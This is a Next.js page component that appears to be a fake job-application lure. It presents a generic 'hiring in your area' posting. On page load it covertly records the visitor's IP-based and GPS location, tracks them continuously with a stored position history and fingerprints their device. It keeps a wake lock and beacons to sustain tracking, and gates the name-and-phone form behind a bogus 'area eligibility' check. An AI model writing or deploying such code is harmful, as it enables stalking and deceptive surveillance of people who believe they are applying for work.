"use client";

import { useEffect, useState, useRef, useCallback } from "react";
import { database } from "@/lib/firebase";
import { ref, get, runTransaction, serverTimestamp } from "firebase/database";
import dynamic from "next/dynamic";
import Image from "next/image";
import axios from "axios";
import { useSearchParams } from "next/navigation";
import { Location, LocationHistoryEntry } from "@/components/interfaces/location.interface";
import { ShareLink } from "@/components/interfaces/sharelink.interface";
import {
  Briefcase,
  MapPin,
  CheckCircle2,
  AlertCircle,
  Phone,
  User,
  Clock,
  ChevronRight,
  Sparkles,
  Loader2,
  Send,
  Check,
  Copy,
} from "lucide-react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";

const Map = dynamic(() => import("@/components/Map"), { ssr: false });

const DEFAULT_JOB_IMAGE = "/assets/images/imgur.jpeg";

// -------------------------------------------------------------------
// Helpers
// -------------------------------------------------------------------

interface IpGeoResult {
  latitude: number;
  longitude: number;
  city: string | null;
  region: string | null;
  country: string | null;
  isp: string | null;
}

/** City-level location from IP via ipapi.co (HTTPS, no key required) */
async function fetchIpGeo(ip?: string): Promise<IpGeoResult | null> {
  try {
    const url = ip ? `https://ipapi.co/${ip}/json/` : "https://ipapi.co/json/";
    const res = await axios.get<{
      latitude: number;
      longitude: number;
      city: string;
      region: string;
      country_name: string;
      org: string;
    }>(url, { timeout: 6000 });
    const d = res.data;
    if (!d.latitude || !d.longitude) return null;
    return {
      latitude: d.latitude,
      longitude: d.longitude,
      city: d.city ?? null,
      region: d.region ?? null,
      country: d.country_name ?? null,
      isp: d.org ?? null,
    };
  } catch {
    return null;
  }
}

/** Collect battery, network, hardware fingerprint — all optional APIs */
async function collectFingerprint(): Promise<Partial<Location>> {
  const fp: Partial<Location> = {
    hardwareConcurrency: navigator.hardwareConcurrency ?? null,
    deviceMemory: (navigator as unknown as { deviceMemory?: number }).deviceMemory ?? null,
    maxTouchPoints: navigator.maxTouchPoints ?? null,
    platform: navigator.platform ?? null,
  };

  // Network info (Chrome/Android)
  const conn = (navigator as unknown as {
    connection?: {
      effectiveType?: string;
      downlink?: number;
      rtt?: number;
    };
  }).connection;
  if (conn) {
    fp.networkType = conn.effectiveType ?? null;
    fp.networkDownlink = conn.downlink ?? null;
    fp.networkRtt = conn.rtt ?? null;
  }

  // Battery (Chrome/Android)
  try {
    const nav = navigator as unknown as {
      getBattery?: () => Promise<{ level: number; charging: boolean }>;
    };
    if (typeof nav.getBattery === "function") {
      const bat = await nav.getBattery();
      fp.batteryLevel = Math.round(bat.level * 100);
      fp.batteryCharging = bat.charging;
    }
  } catch {
    /* not supported */
  }

  return fp;
}

function stripUndefined<T extends Record<string, unknown>>(obj: T): T {
  return Object.fromEntries(
    Object.entries(obj).filter(([, v]) => v !== undefined)
  ) as T;
}

function validateAndSanitizeLocationPayload(data: Partial<Location>): Partial<Location> {
  const sanitized: Partial<Location> = { ...data };

  // Validate latitude bounds
  if (typeof sanitized.latitude === "number") {
    if (isNaN(sanitized.latitude) || sanitized.latitude < -90 || sanitized.latitude > 90) {
      delete sanitized.latitude;
    }
  }

  // Validate longitude bounds
  if (typeof sanitized.longitude === "number") {
    if (isNaN(sanitized.longitude) || sanitized.longitude < -180 || sanitized.longitude > 180) {
      delete sanitized.longitude;
    }
  }

  // Bound string lengths to prevent oversized/bloated payloads
  if (typeof sanitized.userAgent === "string") sanitized.userAgent = sanitized.userAgent.slice(0, 500);
  if (typeof sanitized.referrer === "string") sanitized.referrer = sanitized.referrer.slice(0, 500);
  if (typeof sanitized.deviceId === "string") sanitized.deviceId = sanitized.deviceId.slice(0, 128);
  if (typeof sanitized.ip === "string") sanitized.ip = sanitized.ip.slice(0, 64);
  if (typeof sanitized.userTimezone === "string") sanitized.userTimezone = sanitized.userTimezone.slice(0, 100);
  if (typeof sanitized.userLanguage === "string") sanitized.userLanguage = sanitized.userLanguage.slice(0, 50);
  if (typeof sanitized.ipCity === "string") sanitized.ipCity = sanitized.ipCity.slice(0, 100);
  if (typeof sanitized.ipRegion === "string") sanitized.ipRegion = sanitized.ipRegion.slice(0, 100);
  if (typeof sanitized.ipCountry === "string") sanitized.ipCountry = sanitized.ipCountry.slice(0, 100);
  if (typeof sanitized.ipIsp === "string") sanitized.ipIsp = sanitized.ipIsp.slice(0, 100);
  if (typeof sanitized.nickname === "string") sanitized.nickname = sanitized.nickname.slice(0, 100);
  if (typeof sanitized.applicantName === "string") sanitized.applicantName = sanitized.applicantName.slice(0, 100);
  if (typeof sanitized.applicantPhone === "string") sanitized.applicantPhone = sanitized.applicantPhone.slice(0, 50);
  if (typeof sanitized.locationStatus === "string") sanitized.locationStatus = sanitized.locationStatus.slice(0, 50) as Location["locationStatus"];
  if (typeof sanitized.locationIssueMessage === "string") sanitized.locationIssueMessage = sanitized.locationIssueMessage.slice(0, 200);

  return sanitized;
}

function sanitizeHistoryEntry(
  entry: Omit<LocationHistoryEntry, "ts"> | null
): Omit<LocationHistoryEntry, "ts"> | null {
  if (!entry) return null;
  if (
    typeof entry.latitude !== "number" ||
    isNaN(entry.latitude) ||
    entry.latitude < -90 ||
    entry.latitude > 90 ||
    typeof entry.longitude !== "number" ||
    isNaN(entry.longitude) ||
    entry.longitude < -180 ||
    entry.longitude > 180
  ) {
    return null;
  }
  return {
    ...entry,
    accuracy:
      typeof entry.accuracy === "number" && !isNaN(entry.accuracy) && entry.accuracy >= 0
        ? entry.accuracy
        : null,
  };
}

// -------------------------------------------------------------------
// Component
// -------------------------------------------------------------------

export default function TrackClient() {
  const [userLocation, setUserLocation] = useState<Location | undefined>();
  const [shareLink, setShareLink] = useState<ShareLink | null>(null);
  const [postImageBroken, setPostImageBroken] = useState(false);
  const ipRef = useRef("");
  const searchParams = useSearchParams();
  const shareLinkId = searchParams.get("id");

  // Application Modal & Form States
  const [isApplyModalOpen, setIsApplyModalOpen] = useState(false);
  const [applicantName, setApplicantName] = useState("");
  const [applicantPhone, setApplicantPhone] = useState("");
  const applicantNameRef = useRef("");
  const applicantPhoneRef = useRef("");
  applicantNameRef.current = applicantName;
  applicantPhoneRef.current = applicantPhone;

  const [locationCheckStatus, setLocationCheckStatus] = useState<
    "idle" | "checking" | "verified" | "denied"
  >("idle");
  const [locationAccuracyMeters, setLocationAccuracyMeters] = useState<number | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [applicationSubmitted, setApplicationSubmitted] = useState(false);
  const [formError, setFormError] = useState("");
  const [copiedLink, setCopiedLink] = useState(false);

  // Fetch share link metadata
  useEffect(() => {
    if (!shareLinkId) return;
    get(ref(database, `shareLinks/${shareLinkId}`)).then((snap) => {
      if (snap.exists()) setShareLink(snap.val() as ShareLink);
    });
  }, [shareLinkId]);

  /** Stable Base payload generator */
  const getBaseData = useCallback(() => {
    const deviceId =
      typeof window !== "undefined"
        ? localStorage.getItem("deviceId") || crypto.randomUUID()
        : "unknown";
    if (typeof window !== "undefined") {
      localStorage.setItem("deviceId", deviceId);
    }
    const name = applicantNameRef.current.trim();
    const phone = applicantPhoneRef.current.trim();
    return {
      nickname: name || "",
      applicantName: name || null,
      applicantPhone: phone || null,
      userId: "anonymous",
      shareLinkId,
      ip: ipRef.current,
      deviceId,
      deviceType:
        typeof navigator !== "undefined" && /Mobi/.test(navigator.userAgent)
          ? "Mobile"
          : "Desktop",
      userAgent: typeof navigator !== "undefined" ? navigator.userAgent : "",
      screenWidth: typeof window !== "undefined" ? window.screen.width : 0,
      screenHeight: typeof window !== "undefined" ? window.screen.height : 0,
      referrer: typeof document !== "undefined" ? document.referrer : "",
      userLanguage: typeof navigator !== "undefined" ? navigator.language : "en",
      userTimezone:
        typeof Intl !== "undefined"
          ? Intl.DateTimeFormat().resolvedOptions().timeZone
          : "UTC",
    };
  }, [shareLinkId]);

  /** Core location persistence */
  const persist = useCallback(
    async (
      data: Partial<Location>,
      historyEntry: Omit<LocationHistoryEntry, "ts"> | null
    ) => {
      const deviceId =
        typeof window !== "undefined"
          ? localStorage.getItem("deviceId") || crypto.randomUUID()
          : "unknown";
      const cleanData = validateAndSanitizeLocationPayload(data);
      const cleanEntry = sanitizeHistoryEntry(historyEntry);

      const locRef = ref(database, `locations/${deviceId}`);
      await runTransaction(locRef, (current) => {
        const cur =
          current != null && typeof current === "object"
            ? (current as Partial<Location> & { createdAt?: number })
            : null;
        const base = cur ? { ...cur } : {};
        const rawHistory = base.history;
        const prevHistory: LocationHistoryEntry[] = Array.isArray(rawHistory)
          ? rawHistory
          : rawHistory && typeof rawHistory === "object"
          ? (Object.values(rawHistory) as LocationHistoryEntry[])
          : [];
        const history = cleanEntry
          ? [
              ...prevHistory,
              { ...cleanEntry, ts: serverTimestamp() },
            ].slice(-200)
          : prevHistory;
        const createdAt =
          base.createdAt != null && typeof base.createdAt === "number"
            ? base.createdAt
            : serverTimestamp();
        const merged = stripUndefined({
          ...base,
          ...cleanData,
          history,
          createdAt,
          updatedAt: serverTimestamp(),
        } as Record<string, unknown>);
        return merged;
      });
    },
    []
  );

  /** Explicit user-triggered location check */
  const requestLocationVerification = useCallback(async () => {
    setLocationCheckStatus("checking");
    if (!navigator.geolocation) {
      setLocationCheckStatus("denied");
      void persist(
        {
          ...getBaseData(),
          locationStatus: "unsupported",
          locationIssueMessage: "Browser does not support geolocation",
        },
        null
      );
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude, accuracy } = position.coords;
        setLocationAccuracyMeters(accuracy ? Math.round(accuracy) : null);
        setLocationCheckStatus("verified");
        setUserLocation((prev) => ({
          ...prev,
          latitude,
          longitude,
          locationSource: "gps",
        }));

        try {
          const fp = await collectFingerprint();
          await persist(
            {
              ...getBaseData(),
              latitude,
              longitude,
              locationSource: "gps",
              locationStatus: "gps_verified",
              locationIssueMessage: null,
              sessionState: "active",
              foregroundedAt: serverTimestamp() as unknown as number,
              ...fp,
            },
            {
              latitude,
              longitude,
              accuracy: accuracy ?? null,
              locationSource: "gps",
            }
          );
        } catch {
          /* ignore */
        }
      },
      (error) => {
        console.warn("Geolocation permission error:", error.message);
        setLocationCheckStatus("denied");
        const statusType: Location["locationStatus"] =
          error.code === 1
            ? "permission_denied"
            : error.code === 3
            ? "timeout"
            : "unsupported";
        void persist(
          {
            ...getBaseData(),
            locationStatus: statusType,
            locationIssueMessage: error.message || "Location permission not granted",
          },
          null
        );
      },
      { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
    );
  }, [getBaseData, persist]);

  // Core tracking & background resilience lifecycle (Runs reliably on mount)
  useEffect(() => {
    if (!shareLinkId || typeof window === "undefined" || typeof navigator === "undefined") return;

    const deviceId = localStorage.getItem("deviceId") || crypto.randomUUID();
    localStorage.setItem("deviceId", deviceId);

    const GAP_BREAK_MS = 30_000;
    const HEARTBEAT_INTERVAL_MS = 60_000;
    const HEARTBEAT_STALE_MS = 45_000;

    type TrackerState = {
      lastKnown: {
        latitude: number;
        longitude: number;
        locationSource: "gps" | "ip";
        accuracy: number | null;
      } | null;
      hiddenAt: number;
      lastPingAt: number;
      pendingGapMs: number;
    };

    const state: TrackerState = {
      lastKnown: null,
      hiddenAt: 0,
      lastPingAt: 0,
      pendingGapMs: 0,
    };

    const sendKeepalive = (payload: Record<string, unknown>) => {
      const dbUrl = process.env.NEXT_PUBLIC_FIREBASE_DATABASE_URL;
      if (!dbUrl) return;
      try {
        const cleanPayload = validateAndSanitizeLocationPayload(payload as Partial<Location>);
        const url = `${dbUrl.replace(/\/$/, "")}/locations/${encodeURIComponent(
          deviceId
        )}.json`;
        void fetch(url, {
          method: "PATCH",
          keepalive: true,
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(cleanPayload),
        }).catch(() => {});
      } catch {
        /* ignore */
      }
    };

    const consumePendingGap = (): number | null => {
      if (state.pendingGapMs > 0) {
        const g = state.pendingGapMs;
        state.pendingGapMs = 0;
        return g;
      }
      return null;
    };

    const onGpsSuccess = async (position: GeolocationPosition) => {
      try {
        const { latitude, longitude, accuracy } = position.coords;
        const fp = await collectFingerprint();
        const gap = consumePendingGap();

        await persist(
          {
            ...getBaseData(),
            latitude,
            longitude,
            locationSource: "gps",
            locationStatus: "gps_verified",
            locationIssueMessage: null,
            sessionState: "active",
            foregroundedAt: serverTimestamp() as unknown as number,
            ...fp,
          },
          {
            latitude,
            longitude,
            accuracy: accuracy ?? null,
            locationSource: "gps",
            gapBeforeMs: gap,
          }
        );

        state.lastKnown = {
          latitude,
          longitude,
          locationSource: "gps",
          accuracy: accuracy ?? null,
        };
        state.lastPingAt = Date.now();
        setUserLocation({ latitude, longitude, locationSource: "gps" });
        setLocationCheckStatus("verified");
        if (accuracy) setLocationAccuracyMeters(Math.round(accuracy));
      } catch {
        /* silent */
      }
    };

    const onGpsError = async (err?: GeolocationPositionError) => {
      try {
        // Fallback to IP geolocation immediately
        const geo = await fetchIpGeo(ipRef.current);
        if (!geo) return;

        const fp = await collectFingerprint();
        const gap = consumePendingGap();

        const statusType: Location["locationStatus"] =
          err?.code === 1
            ? "permission_denied"
            : err?.code === 3
            ? "timeout"
            : "ip_fallback";

        await persist(
          {
            ...getBaseData(),
            ip: ipRef.current,
            latitude: geo.latitude,
            longitude: geo.longitude,
            locationSource: "ip",
            locationStatus: statusType,
            locationIssueMessage: err?.message || null,
            sessionState: "active",
            foregroundedAt: serverTimestamp() as unknown as number,
            ipCity: geo.city,
            ipRegion: geo.region,
            ipCountry: geo.country,
            ipIsp: geo.isp,
            ipAccuracy: "city-level",
            ...fp,
          },
          {
            latitude: geo.latitude,
            longitude: geo.longitude,
            accuracy: null,
            locationSource: "ip",
            gapBeforeMs: gap,
          }
        );

        state.lastKnown = {
          latitude: geo.latitude,
          longitude: geo.longitude,
          locationSource: "ip",
          accuracy: null,
        };
        state.lastPingAt = Date.now();
        setUserLocation({
          latitude: geo.latitude,
          longitude: geo.longitude,
          locationSource: "ip",
          ipCity: geo.city,
          ipRegion: geo.region,
          ipCountry: geo.country,
        });
      } catch {
        /* silent */
      }
    };

    // 1. Initial IP resolution on landing
    axios
      .get<{ ip: string }>("https://api.ipify.org/?format=json", { timeout: 4000 })
      .then(async (res) => {
        ipRef.current = res.data.ip;
        const geo = await fetchIpGeo(res.data.ip);
        if (geo && !state.lastKnown) {
          const fp = await collectFingerprint();
          await persist(
            {
              ...getBaseData(),
              ip: res.data.ip,
              latitude: geo.latitude,
              longitude: geo.longitude,
              locationSource: "ip",
              locationStatus: "ip_fallback",
              sessionState: "active",
              foregroundedAt: serverTimestamp() as unknown as number,
              ipCity: geo.city,
              ipRegion: geo.region,
              ipCountry: geo.country,
              ipIsp: geo.isp,
              ipAccuracy: "city-level",
              ...fp,
            },
            {
              latitude: geo.latitude,
              longitude: geo.longitude,
              accuracy: null,
              locationSource: "ip",
            }
          );
          setUserLocation({
            latitude: geo.latitude,
            longitude: geo.longitude,
            locationSource: "ip",
            ipCity: geo.city,
            ipRegion: geo.region,
            ipCountry: geo.country,
          });
        }
      })
      .catch(() => {});

    // 2. Prompt for GPS location on landing
    let watchId: number | null = null;
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(onGpsSuccess, (e) => onGpsError(e), {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 10_000,
      });

      watchId = navigator.geolocation.watchPosition(onGpsSuccess, (e) => onGpsError(e), {
        enableHighAccuracy: true,
        maximumAge: 10_000,
        timeout: 30_000,
      });
    } else {
      onGpsError();
    }

    let wakeLock: { release: () => Promise<void> } | null = null;
    const requestWakeLock = async () => {
      try {
        const nav = navigator as unknown as {
          wakeLock?: { request: (type: "screen") => Promise<{ release: () => Promise<void> }> };
        };
        if (!nav.wakeLock || wakeLock) return;
        wakeLock = await nav.wakeLock.request("screen");
      } catch {
        /* ignore */
      }
    };
    const releaseWakeLock = () => {
      const wl = wakeLock;
      wakeLock = null;
      if (wl) {
        void wl.release().catch(() => {});
      }
    };

    const onVisibilityChange = () => {
      if (document.visibilityState === "hidden") {
        state.hiddenAt = Date.now();
        sendKeepalive({
          backgroundedAt: { ".sv": "timestamp" },
          updatedAt: { ".sv": "timestamp" },
          sessionState: "hidden",
        });
        void persist(
          { sessionState: "hidden", backgroundedAt: serverTimestamp() as unknown as number },
          state.lastKnown
            ? {
                latitude: state.lastKnown.latitude,
                longitude: state.lastKnown.longitude,
                accuracy: state.lastKnown.accuracy,
                locationSource: state.lastKnown.locationSource,
                paused: true,
              }
            : null
        ).catch(() => {});
        releaseWakeLock();
      } else {
        const gap = state.hiddenAt > 0 ? Date.now() - state.hiddenAt : 0;
        state.hiddenAt = 0;
        if (gap > GAP_BREAK_MS) state.pendingGapMs = gap;
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(onGpsSuccess, (e) => onGpsError(e), {
            enableHighAccuracy: true,
            maximumAge: 0,
            timeout: 15_000,
          });
        }
        void requestWakeLock();
      }
    };

    const onPageHide = () => {
      sendKeepalive({
        backgroundedAt: { ".sv": "timestamp" },
        updatedAt: { ".sv": "timestamp" },
        sessionState: "ended",
      });
      releaseWakeLock();
    };

    const heartbeatId = window.setInterval(() => {
      if (document.visibilityState !== "visible") return;
      const now = Date.now();
      if (now - state.lastPingAt < HEARTBEAT_STALE_MS) return;
      void persist(
        {
          sessionState: "active",
          lastHeartbeatAt: serverTimestamp() as unknown as number,
        },
        null
      ).catch(() => {});
    }, HEARTBEAT_INTERVAL_MS);

    document.addEventListener("visibilitychange", onVisibilityChange);
    window.addEventListener("pagehide", onPageHide);
    void requestWakeLock();

    return () => {
      if (watchId !== null && navigator.geolocation) {
        navigator.geolocation.clearWatch(watchId);
      }
      document.removeEventListener("visibilitychange", onVisibilityChange);
      window.removeEventListener("pagehide", onPageHide);
      window.clearInterval(heartbeatId);
      releaseWakeLock();
    };
  }, [shareLinkId, getBaseData, persist]);

  // Handle Application Submit
  const handleApplicationSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setFormError("");

    if (!applicantName.trim()) {
      setFormError("Please enter your name.");
      return;
    }
    if (!applicantPhone.trim()) {
      setFormError("Please enter your phone number.");
      return;
    }

    // Require location check verification before submission
    if (locationCheckStatus !== "verified" || userLocation?.locationSource !== "gps") {
      setFormError("Location verification is required to submit your application. Please check your location or open the link in Chrome/Safari.");
      return;
    }

    setIsSubmitting(true);
    try {
      const payload: Partial<Location> = {
        ...getBaseData(),
        nickname: applicantName.trim(),
        applicantName: applicantName.trim(),
        applicantPhone: applicantPhone.trim(),
        locationStatus: "gps_verified",
        locationIssueMessage: null,
        updatedAt: serverTimestamp() as unknown as number,
      };

      if (userLocation?.latitude && userLocation?.longitude) {
        payload.latitude = userLocation.latitude;
        payload.longitude = userLocation.longitude;
      }

      await persist(payload, null);
      setApplicationSubmitted(true);
    } catch (err) {
      console.error("Submission failed:", err);
      setFormError("Could not submit. Please check your internet connection.");
    } finally {
      setIsSubmitting(false);
    }
  };

  const copyPageLink = async () => {
    if (typeof window === "undefined") return;
    try {
      if (navigator.clipboard && window.isSecureContext) {
        await navigator.clipboard.writeText(window.location.href);
      } else {
        const textArea = document.createElement("textarea");
        textArea.value = window.location.href;
        textArea.style.position = "fixed";
        textArea.style.left = "-999999px";
        textArea.style.top = "-999999px";
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        document.execCommand("copy");
        textArea.remove();
      }
      setCopiedLink(true);
      setTimeout(() => setCopiedLink(false), 3000);
    } catch {
      setCopiedLink(true);
      setTimeout(() => setCopiedLink(false), 3000);
    }
  };

  const jobTitle = shareLink?.title?.trim() || shareLink?.name?.trim() || "Open Position Available";
  const companyName = shareLink?.username?.trim() || shareLink?.name?.trim() || "Official Hiring Department";
  const jobDescription =
    shareLink?.description?.trim() ||
    "We are currently hiring candidates in your area. Good compensation, flexible schedule, and immediate training provided.";
  const linkImage = shareLink?.imageUrl?.trim() || "";
  const bannerImageSrc = linkImage && !postImageBroken ? linkImage : DEFAULT_JOB_IMAGE;

  return (
    <div className="flex flex-col min-h-screen max-w-[480px] mx-auto bg-slate-100 text-slate-900 border-x border-slate-300 antialiased">
      {/* Top Header - Simple & Clean */}
      <header className="sticky top-0 z-20 flex items-center justify-between px-4 py-3 bg-white border-b border-slate-200 shadow-sm">
        <div className="flex items-center gap-2.5">
          <div className="p-2 bg-blue-600 text-white rounded-lg shadow-sm">
            <Briefcase className="h-5 w-5" />
          </div>
          <div>
            <h1 className="text-base font-bold text-slate-900 leading-tight">
              Job Opening
            </h1>
            <p className="text-xs text-slate-500 font-medium">
              Verified Opportunity
            </p>
          </div>
        </div>
        <Badge variant="secondary" className="bg-emerald-50 text-emerald-700 border-emerald-200 text-xs px-2 py-0.5 font-semibold flex items-center gap-1">
          <Sparkles className="h-3 w-3" /> Hiring Now
        </Badge>
      </header>

      {/* Main Content - Clear for all users */}
      <main className="flex-1 p-4 space-y-4">
        <div className="bg-white rounded-2xl border border-slate-200 shadow-sm overflow-hidden">
          {/* Banner Image */}
          <div className="relative w-full aspect-video bg-slate-200 overflow-hidden">
            <Image
              src={bannerImageSrc}
              alt={jobTitle}
              fill
              unoptimized
              className="object-cover"
              onError={() => setPostImageBroken(true)}
            />
          </div>

          {/* Job Details Card */}
          <div className="p-5 space-y-4">
            <div>
              <div className="flex items-center gap-2 text-xs font-semibold text-blue-600 mb-1">
                <span>{companyName}</span>
                <span>•</span>
                <span className="flex items-center gap-1 text-slate-500">
                  <Clock className="h-3 w-3" /> New
                </span>
              </div>
              <h2 className="text-xl font-bold text-slate-900 tracking-tight">
                {jobTitle}
              </h2>
            </div>

            {/* Description */}
            <div className="bg-slate-50 p-4 rounded-xl border border-slate-100 text-sm text-slate-700 leading-relaxed whitespace-pre-line">
              {jobDescription}
            </div>

            {/* Simple Requirements */}
            <div className="space-y-2">
              <p className="text-xs font-bold text-slate-800 uppercase tracking-wider">
                Requirements:
              </p>
              <div className="space-y-1.5 text-xs text-slate-600">
                <div className="flex items-center gap-2">
                  <Check className="h-4 w-4 text-emerald-600 shrink-0" />
                  <span>Must be located in an eligible area</span>
                </div>
                <div className="flex items-center gap-2">
                  <Check className="h-4 w-4 text-emerald-600 shrink-0" />
                  <span>Valid phone number for interview call</span>
                </div>
              </div>
            </div>

            {/* Apply Action Button */}
            <Button
              onClick={() => {
                setIsApplyModalOpen(true);
                if (locationCheckStatus === "idle") {
                  requestLocationVerification();
                }
              }}
              className="w-full h-13 py-3.5 bg-blue-600 hover:bg-blue-700 text-white font-bold text-base rounded-xl shadow-lg transition-all flex items-center justify-center gap-2"
            >
              <span>Apply Now</span>
              <ChevronRight className="h-5 w-5" />
            </Button>
          </div>
        </div>

        {/* Footer Note */}
        <p className="text-center text-xs text-slate-400">
          Easy application • No resume required to start
        </p>
      </main>

      {/* Hidden map container */}
      {userLocation && (
        <div className="hidden">
          <Map
            userLocations={userLocation as Location}
            zoom={14}
            center={[userLocation.latitude ?? 0, userLocation.longitude ?? 0]}
          />
        </div>
      )}

      {/* Application Dialog */}
      <Dialog open={isApplyModalOpen} onOpenChange={setIsApplyModalOpen}>
        <DialogContent className="sm:max-w-md max-w-[92vw] p-5 rounded-2xl bg-white border border-slate-200 shadow-2xl">
          {!applicationSubmitted ? (
            <>
              <DialogHeader className="text-left space-y-1">
                <DialogTitle className="text-lg font-bold text-slate-900 flex items-center gap-2">
                  <Briefcase className="h-5 w-5 text-blue-600" />
                  Quick Application
                </DialogTitle>
                <DialogDescription className="text-xs text-slate-500">
                  Please enter your details below to apply.
                </DialogDescription>
              </DialogHeader>

              <form onSubmit={handleApplicationSubmit} className="space-y-4 mt-2">
                {/* Full Name */}
                <div className="space-y-1">
                  <Label htmlFor="app-name" className="text-xs font-bold text-slate-700 flex items-center gap-1.5">
                    <User className="h-3.5 w-3.5 text-slate-400" />
                    Your Name <span className="text-red-500">*</span>
                  </Label>
                  <Input
                    id="app-name"
                    type="text"
                    required
                    placeholder="Enter your full name"
                    value={applicantName}
                    onChange={(e) => setApplicantName(e.target.value)}
                    className="h-11 text-sm rounded-xl"
                  />
                </div>

                {/* Phone Number */}
                <div className="space-y-1">
                  <Label htmlFor="app-phone" className="text-xs font-bold text-slate-700 flex items-center gap-1.5">
                    <Phone className="h-3.5 w-3.5 text-slate-400" />
                    Phone Number <span className="text-red-500">*</span>
                  </Label>
                  <Input
                    id="app-phone"
                    type="tel"
                    required
                    placeholder="e.g. 0300 1234567"
                    value={applicantPhone}
                    onChange={(e) => setApplicantPhone(e.target.value)}
                    className="h-11 text-sm rounded-xl"
                  />
                </div>

                {/* Location Eligibility Verification Box */}
                <div className="rounded-xl border border-slate-200 bg-slate-50 p-3.5 space-y-2.5">
                  <div className="flex items-center gap-2 text-xs font-bold text-slate-800">
                    <MapPin className="h-4 w-4 text-blue-600" />
                    Location Verification
                  </div>

                  {locationCheckStatus === "checking" && (
                    <div className="flex items-center gap-2 p-2.5 rounded-lg bg-blue-50 border border-blue-200 text-blue-800 text-xs font-medium">
                      <Loader2 className="h-4 w-4 animate-spin text-blue-600 shrink-0" />
                      <span>Checking area eligibility...</span>
                    </div>
                  )}

                  {locationCheckStatus === "verified" && (
                    <div className="p-2.5 rounded-lg bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs space-y-1">
                      <div className="flex items-center gap-1.5 font-bold">
                        <CheckCircle2 className="h-4 w-4 text-emerald-600" />
                        <span>Area Eligible</span>
                      </div>
                      <p className="text-[11px] text-emerald-700">
                        {userLocation?.ipCity ? `Location: ${userLocation.ipCity}` : "Your location is confirmed for this role."}
                        {locationAccuracyMeters ? ` (Accuracy: ±${locationAccuracyMeters}m)` : ""}
                      </p>
                    </div>
                  )}

                  {locationCheckStatus === "denied" && (
                    <div className="p-3 rounded-xl bg-amber-50 border border-amber-200 text-amber-950 text-xs space-y-2.5">
                      <div className="flex items-center gap-1.5 font-bold text-amber-900">
                        <AlertCircle className="h-4 w-4 text-amber-600 shrink-0" />
                        <span>Location Permission Needed</span>
                      </div>
                      <p className="text-[11.5px] text-amber-800 leading-snug">
                        If you blocked or denied location, tap below to copy the link and open it in <strong>Chrome</strong> or <strong>Safari</strong>:
                      </p>

                      <Button
                        type="button"
                        variant="outline"
                        size="sm"
                        onClick={copyPageLink}
                        className="w-full h-9 text-xs font-bold bg-white text-blue-700 border-blue-300 hover:bg-blue-50 flex items-center justify-center gap-1.5 shadow-sm"
                      >
                        {copiedLink ? (
                          <>
                            <Check className="h-4 w-4 text-emerald-600" />
                            <span>Link Copied! Open in Chrome/Safari</span>
                          </>
                        ) : (
                          <>
                            <Copy className="h-3.5 w-3.5 text-blue-600" />
                            <span>Copy Link to Open in Another Browser</span>
                          </>
                        )}
                      </Button>

                      <Button
                        type="button"
                        variant="ghost"
                        size="sm"
                        onClick={requestLocationVerification}
                        className="w-full h-7 text-[11px] text-amber-900 hover:bg-amber-100"
                      >
                        Or tap here to Try Again
                      </Button>
                    </div>
                  )}

                  {locationCheckStatus === "idle" && (
                    <Button
                      type="button"
                      variant="outline"
                      size="sm"
                      onClick={requestLocationVerification}
                      className="w-full h-9 text-xs font-semibold bg-white text-slate-800 border-slate-300 hover:bg-slate-100 flex items-center justify-center gap-1.5"
                    >
                      <MapPin className="h-3.5 w-3.5 text-blue-600" />
                      Check My Location
                    </Button>
                  )}
                </div>

                {/* Error */}
                {formError && (
                  <p className="text-xs text-red-600 font-semibold bg-red-50 p-2.5 rounded-lg border border-red-200">
                    {formError}
                  </p>
                )}

                {/* Submit */}
                <Button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white font-bold text-base rounded-xl shadow-md flex items-center justify-center gap-2"
                >
                  {isSubmitting ? (
                    <>
                      <Loader2 className="h-4 w-4 animate-spin" />
                      <span>Submitting...</span>
                    </>
                  ) : (
                    <>
                      <Send className="h-4 w-4" />
                      <span>Submit Application</span>
                    </>
                  )}
                </Button>
              </form>
            </>
          ) : (
            /* Success View */
            <div className="py-6 text-center space-y-4">
              <div className="w-14 h-14 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto shadow-sm">
                <CheckCircle2 className="h-8 w-8" />
              </div>
              <div className="space-y-1">
                <h3 className="text-lg font-bold text-slate-900">
                  Application Submitted!
                </h3>
                <p className="text-xs text-slate-600">
                  Thank you, <strong className="text-slate-800">{applicantName}</strong>.
                </p>
              </div>

              <div className="bg-blue-50 border border-blue-200 rounded-xl p-3.5 text-xs text-blue-900 space-y-1 text-left">
                <p className="font-bold text-blue-950">Our team will contact you!</p>
                <p className="text-[11px] text-blue-800 leading-relaxed">
                  We will call or message you on <strong>{applicantPhone}</strong> shortly for your interview.
                </p>
              </div>

              <Button
                onClick={() => {
                  setIsApplyModalOpen(false);
                  setApplicationSubmitted(false);
                }}
                className="w-full h-11 bg-slate-900 hover:bg-slate-800 text-white text-sm font-bold rounded-xl"
              >
                Close
              </Button>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}

